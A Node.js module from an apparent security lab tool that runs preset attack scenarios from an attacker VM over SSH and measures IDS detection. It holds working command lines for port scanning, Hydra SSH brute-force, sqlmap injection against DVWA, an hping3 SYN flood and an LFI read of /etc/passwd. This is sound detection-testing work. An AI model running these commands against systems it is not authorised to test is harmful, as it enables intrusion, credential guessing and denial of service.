'use strict';
/**
 * Chay kich ban tan cong tu web tren may "attacker" qua SSH.
 * Gioi han an toan: chi chay tren VM co vai tro "attacker", danh sach lenh co san.
 * Tu dong do hieu qua phat hien (detection metrics) qua canh bao IDS phat sinh.
 */
const ssh = require('./ssh');
const vms = require('./vms');
const alerts = require('./alerts');
const { shq } = ssh;
const { HttpError } = require('../http');

// Danh sach kich ban hop le — chi attacker VM moi chay duoc
const SCENARIOS = {
  'nmap_scan': {
    name: 'Nmap scan (SYN)',
    desc: 'Quét cổng SYN vào máy victim (100 cổng phổ biến)',
    cmd: (target) => `nmap -sS -T4 --top-ports 100 ${shq(target)} 2>&1 | tail -40`,
    timeout: 40000
  },
  'nmap_os': {
    name: 'Nmap OS detect',
    desc: 'Quét nhận dạng hệ điều hành',
    cmd: (target) => `nmap -O --osscan-guess ${shq(target)} 2>&1 | tail -40`,
    timeout: 60000
  },
  'ssh_bruteforce': {
    name: 'SSH brute-force (Hydra)',
    desc: 'Thử mật khẩu SSH vào victim (giới hạn an toàn trong lab)',
    cmd: (target) => `hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f -s 22 ${shq(target)} ssh -e nsr 2>&1 | head -30 || echo "hydra not found or finished"`,
    timeout: 60000
  },
  'sqli_test': {
    name: 'SQL Injection (sqlmap)',
    desc: 'Thử nghiệm SQL injection vào DVWA',
    cmd: (target) => `sqlmap -u "http://${shq(target).replace(/'/g, '')}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="DVWASECURITY=low;PHPSESSID=test" --level=1 --risk=1 --batch --forms 2>&1 | tail -30`,
    timeout: 90000
  },
  'syn_flood': {
    name: 'SYN Flood (hping3, 5s)',
    desc: 'Gửi gói tin SYN trong 5 giây vào victim:80 (giới hạn thời gian)',
    cmd: (target) => `timeout 5 hping3 -S --flood -p 80 ${shq(target)} 2>&1 || echo "flood done or hping3 not found"`,
    timeout: 12000
  },
  'curl_sensitive': {
    name: 'Đọc file nhạy cảm (curl /etc/passwd)',
    desc: 'Thử đọc /etc/passwd qua lỗ hổng Path Traversal / LFI',
    cmd: (target) => `curl -s --max-time 5 "http://${shq(target).replace(/'/g, '')}/dvwa/vulnerabilities/fi/?page=/etc/passwd" 2>&1 | head -20`,
    timeout: 15000
  }
};

const running = new Map(); // runId -> rec
const history = [];        // mang cac lan chay gan nhat (toi da 50)
let idCounter = 0;

function listScenarios() {
  return Object.entries(SCENARIOS).map(([id, s]) => ({ id, name: s.name, desc: s.desc }));
}

function computeMetrics(rec) {
  const vm = vms.byId(rec.vmId);
  const vmIp = vm ? vm.ip : '';
  const now = rec.endAt || Date.now();
  // Tim tat ca canh bao tu rec.startAt den hien tai co lien quan den target hoac attacker VM
  const matched = alerts.all().filter(a => {
    if (a.ts < rec.startAt - 2000 || a.ts > now + 10000) return false;
    return a.ip === rec.target || a.dst_ip === rec.target ||
           (vmIp && (a.ip === vmIp || a.dst_ip === vmIp));
  });

  const firstAlert = matched.length ? Math.min(...matched.map(a => a.ts)) : null;
  return {
    alertCount: matched.length,
    detected: matched.length > 0,
    latencyMs: firstAlert ? Math.max(0, firstAlert - rec.startAt) : null,
    types: [...new Set(matched.map(a => a.type))],
    signatures: [...new Set(matched.map(a => a.signature))],
    alerts: matched.slice(0, 10).map(a => ({ id: a.id, sev: a.sev, type: a.type, signature: a.signature, ts: a.ts }))
  };
}

function listHistory() {
  return history.slice(0, 50).map(h => ({
    ...h,
    metrics: h.metrics || computeMetrics(h)
  }));
}

function getStatus(runId) {
  const r = running.get(runId) || history.find(h => h.id === runId);
  if (!r) throw new HttpError(404, 'Khong tim thay ket qua chay');
  return {
    ...r,
    metrics: computeMetrics(r)
  };
}

async function run(scenarioId, vmId, targetIp, user) {
  const sc = SCENARIOS[scenarioId];
  if (!sc) throw new HttpError(400, 'Kich ban khong ton tai: ' + scenarioId);

  const vm = vms.byId(vmId);
  if (!vm) throw new HttpError(404, 'Khong tim thay VM');
  if (!(vm.roles || []).includes('attacker')) throw new HttpError(403, 'VM nay khong co vai tro "attacker". Chi chay kich ban tren may tan cong.');
  if (!vm.sshUser) throw new HttpError(400, 'VM chua cau hinh SSH');

  // Gioi han: moi VM chi chay 1 kich ban 1 luc
  for (const [, r] of running) {
    if (r.vmId === vmId && !r.done) throw new HttpError(409, 'VM nay dang chay kich ban khac, vui long cho.');
  }

  if (!targetIp || !/^[A-Za-z0-9.:_-]+$/.test(targetIp)) throw new HttpError(400, 'IP/host muc tieu khong hop le');

  const runId = `run-${Date.now().toString(36)}-${(++idCounter).toString(36)}`;
  const rec = {
    id: runId,
    scenario: scenarioId,
    scenarioName: sc.name,
    vmId,
    vmName: vm.name,
    target: targetIp,
    startAt: Date.now(),
    done: false,
    output: '',
    error: null,
    user: user.username
  };
  running.set(runId, rec);

  // Chay bat dong bo
  (async () => {
    try {
      const result = await ssh.exec(vm, sc.cmd(targetIp), { sudo: false, timeout: sc.timeout });
      rec.output = (result.stdout || '') + (result.stderr ? '\n[stderr]\n' + result.stderr : '');
      rec.exitCode = result.code;
    } catch (e) {
      rec.error = e.message;
      rec.output = '[Loi: ' + e.message + ']';
    } finally {
      rec.done = true;
      rec.endAt = Date.now();
      // Chờ 3s để các cảnh báo từ sensor/Wazuh kịp về
      setTimeout(() => {
        rec.metrics = computeMetrics(rec);
      }, 3000);
      running.delete(runId);
      history.unshift(rec);
      if (history.length > 50) history.length = 50;
    }
  })();

  return runId;
}

module.exports = { listScenarios, listHistory, getStatus, run, running, computeMetrics };
